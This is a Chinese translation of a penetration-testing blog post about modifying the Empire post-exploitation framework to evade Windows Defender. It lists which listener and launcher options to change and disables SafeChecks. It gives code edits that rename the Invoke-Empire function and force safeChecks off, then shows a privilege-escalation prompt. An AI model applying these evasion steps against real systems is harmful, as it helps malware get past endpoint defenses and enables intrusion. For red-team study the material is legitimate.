**防病毒规避技术一直以来是我最感兴趣的研究方向之一。多年前，当我开始研究计算机科学时，我向我的顾问提出了一个主题，即通过映射二进制文件中的执行流，来改进防病毒引擎以检测多态病毒。但随着研究的深入，这个设想最终还是被否决了，所以我选择了另一个研究课题。**

如果你的工作是渗透测试或在红队中，那么防病毒绕过技术将是你必备的一项技能。但不得不说这也是一个令人沮丧的领域 -虽说“基于签名的”防病毒软件在阻止威胁方面并没有太大的作用，但有时却会给我们带来极大的麻烦。

我们知道想要逃避防病毒软件最好的办法就是“编写自己的工具”。例如编写一个自己的简单反向shell，或是如果你有足够的资金预算和时间，那么也可以尝试从头开发一个完善的C2架构。然而，大多数人还是依赖于安全社区中其他人开发的开源（和商业）工具。

说到这，我不得不提Empire。[Empire是一款后渗透利用代理工具](https://www.powershellempire.com/)，其中包含了各种的攻击性工具。这是一款非常强大的工具，如果在执行的过程中没有被防病毒程序标记，那么它完全可以作为攻击性操作的一部分使用。有一段时间，Empire对于逃避像Windows
Defender这样的程序非常有用。但现在已经不行了，如果你创建一个通用的http listener agent
payload并在内存中执行，甚至还没有触及磁盘，你可能就会看到如下所示内容。

![修改Empire绕过Windows
Defender](https://image.3001.net/images/20190307/1551926881_5c808661bad18.png!small)

可以看到，Windows Defender检测并阻止了我们的行为。

但别忘了Empire是一款免费且开源的工具，我们可以通过修改一些关键区域来尝试绕过客户端防病毒软件。

在我们的测试开始之前，我们先来关闭Windows Defender中的“Cloud-delivered
Protection”，尤其是“自动样本提交（Automatic sample
submission）”。我们不希望我们的任何测试接入互联网，并进入Windows Defender的分布式签名当中。另外，请保持“实时保护（Real-time protection）”，以便我们测试执行的情况。

![windows-defender-settings.png](https://image.3001.net/images/20190307/1551926906_5c80867a4a5b8.png!small)

记住！无论你做什么，都不要将病毒上传到VIRUS
TOTAL！否则你的一切努力都将白费！正如下面你将学到的，即使初始payload通过防病毒检查，Windows Defender也可以检测到Empire。

现在我们的测试实验环境已准备就绪，是时候开始使用Empire了。

在前几次绕过Windows Defender的尝试中，我设置了Empire launcher payload内的misc选项，但最终都以失败告终。

![3empire-http-listener-defaults.png](https://image.3001.net/images/20190307/1551926938_5c80869ac3027.png!small)

![4empire-http-stager-defaults.png](https://image.3001.net/images/20190307/1551926957_5c8086ad40d6c.png!small)

接着，我尝试通过混淆的办法来进行绕过。我尝试使用powershell混淆工具来运行有效载荷。通过Unicorn运行它...？失败。通过Veil
Framework运行它...？失败。通过Empire自己的原生Invoke-Obfuscation运行它...？还是失败。

但我注意到一点，通过使用混淆工具我能够将payload写入磁盘，基本上是绕过了防病毒签名，但在执行时会被检测并阻止。

## 剖析 Empire

Empire生成的初始payload即所谓的“stager”，确切地说应该是stage0
payload。stager是一些代码，用于远程下载和执行另一个stager或实际payload。在我们的示例中，我们将使用multi/launcher
powershell stager来获取http listener。

测试stage0
payload实际上非常简单。生成payload，将其写入文件，然后传输到Windows机器。如果它在命中磁盘时触发防病毒警告，则表示你还有许多其它工作需要做。如果它成功传送并正常执行，则表示你获取到了一个可用的stager。

一个非常重要的说明！在我的测试期间我遇到了一个问题，就是在反复进行payload测试后，Windows
Defender很可能会将所有的powershell文件标记为病毒，甚至是空文件！如果发生这种情况，请重启VM或计算机。我的看法是，Windows
Defender可能知道我正在传输文件的主机是恶意的，因此无论文件是什么，PowerShell都会被禁止执行。

你可能会感到震惊，生成绕过Windows Defender的multi/launcher
stager，只需使用Empire中显示的选项即可实现。但我不会告诉你我所使用的确切选项，因为我知道有人会立即使用它们，并忽略我的警告将它们上传到Virus
Total。但我会向你们展示我建议修改的选项。

 **建议修改的 Empire http listener 选项**

选项| 描述| 默认  
---|---|---  
默认配置文件| Empire将在不同时间调用的三个URL以及User-Agent字符串。|
/admin/get.php,/news.php,/login/process.php|Mozilla/5.0 (Windows NT 6.1;
WOW64; Trident/7.0; rv:11.0) like Gecko  
服务器版本| Web服务器版本标识符| Microsoft-IIS/7.5  
主机| 你的主机（或IP）和端口号。|  
端口| 应与指定的主机端口相同|  
用户代理| Empire为模拟真实的Web浏览器流量而发送的用户代理。| Mozilla/5.0 (Windows NT 10.0; Win64; x64)
AppleWebKit/537.36 (KHTML, like Gecko) Chrome/71.0.3578.98 Safari/537.36  
StagerURI| 向Stager提供的URI。必须包括/download才能工作，而不需要进行额外的修改。|  
证书路径| 设置Empire时默认的自签名证书位于./Empire/Data。根据环境的复杂程度，自签名证书可能不起作用。Windows
Defender不介意自签名证书。|  
默认Jitter| 向Empire服务器发送信标呼叫时的随机延迟。| 0.0  
Launcher| 用于执行stager的命令。| powershell -noP -sta -w 1 -enc  
  
 **建议修改的 Empire multi/launcher 选项**

选项| 描述| 默认  
---|---|---  
Listener| 此项为必设项|  
UserAgent| 用户代理字符串|  
SafeChecks| 尝试检测launcher是否在沙箱中运行。| True  
混淆| 混淆自动生成的launcher代码。| False  
混淆命令| 使用的混淆命令。| Token\All\1,Launcher\STDIN++\12467  
  
这里给大家一个提示。将SafeChecks设置为false。SafeChecks试图确定stager是否在防病毒沙箱中运行。此外，这也会减少大量生成的代码，但由于我们被防病毒软件检测到了，因此显然无法正常工作。

有了这样一个被我们“武器化”的payload，是不是意味着我们就一定能够运行Empire？如下所示payload将执行，并且你会看到一个初始连接Sending
stage 1！接着便出现了问题。

![5empire-http-stage1-fails.png](https://image.3001.net/images/20190307/1551926987_5c8086cbaa29b.png!small)

在测试期间，我决定关闭防病毒保护，在Windows主机上启动Empire，然后重启防病毒软件。令我兴奋的是，我的Empire
beacon并没有死！只要我们能让Empire启动就行。但为什么无法启动呢？

深入挖掘Empire代码库会生成stage1代码。这段代码建立了加密安全环境以躲避检测，但它本身并没有以任何方式进行编码。经过一些测试和错误之后，编辑了文件和某些部分，我确定应该问题应该出在invokeEmpire函数名。正如[Black
Hills Information Security](https://www.blackhillsinfosec.com/bypass-anti-virus-run-mimikatz/)文章中所建议的那样，将函数名更改为invoke
randomstringhere是阻止检测的必要手段。尽管我们要做的只是修改invokeEmpire函数名，但如果你能进一步的更改stage1代码，那无疑将是巨大的加分项。

 **Edit: ./Empire/data/agent/stagers/http.ps1：**

    
    
    Invoke-Empire -Servers @(($s -split "/")[0..2] -join "/") -StagingKey $SK -SessionKey $key -SessionID $ID -WorkingHours "WORKING_HOURS_REPLACE" -KillDate "REPLACE_KILLDATE" -ProxySettings $Script:Proxy;

 **Edit: ./Empire/data/agent/agent.ps1**

    
    
    function Invoke-Empire {

让我们再次尝试运行我们的Empire stager。

![6empire-http-av-bypass.png](https://image.3001.net/images/20190307/1551927012_5c8086e482560.png!small)

可以看到我们成功绕过了Windows Defender！

由于是在完全修补的Win10主机上运行测试，因此提权的方法并不多。所以，让我们尝试一下powershell/privesc/ask模块，它会弹出一个对话框，询问用户是否要以管理员身份运行powershell。漏洞利用成功弹出了对话框，这是一个好兆头！我点击是！然而什么也没发生。

我承认这让我感到有些困惑。如果我的stagers在初始利用时工作，那么为什么不能提权呢？经过一些调试之后，我能够捕获使用privesc/ask模块发送的stager。虽然它包含了我在multi/launcher配置中设置的一些修改，但有一个明显的区别。它还包含了我们之前设置为False的SafeChecks代码！

![7empire-launcher-safe-checks.png](https://image.3001.net/images/20190307/1551927042_5c80870239f27.png!small)

我不确定这里包含的SafeChecks，是否是由于Empire中存在的bug导致的。但是，SafeChecks代码当前存在问题，似乎已被该Empire
bug所证实。只需将选项设置始终保持为 False，就可以解决我们的问题。

 **Edit: ./Empire/lib/listeners/http.py：**

    
    
    def generate_launcher(self, encode=True, obfuscate=False, obfuscationCommand="", userAgent='default', proxy='default', proxyCreds='default', stagerRetries='0', language=None, safeChecks='', listenerName=None):
            """
            Generate a basic launcher for the specified listener.
            """
    
            # Add this line to override SafeChecks
            safeChecks='False'

运行`python -m compileall`并重启Empire。然后启动powershell/privesc/ask。

 **![8empire-http-privesc-av-bypass.png](https://image.3001.net/images/20190307/1551927065_5c808719e3ecf.png!small)**

 ***参考来源：[mike-gualtieri](https://www.mike-gualtieri.com/posts/modifying-empire-to-evade-windows-defender)，FB小编secist编译，转载请注明来自FreeBuf.COM**  

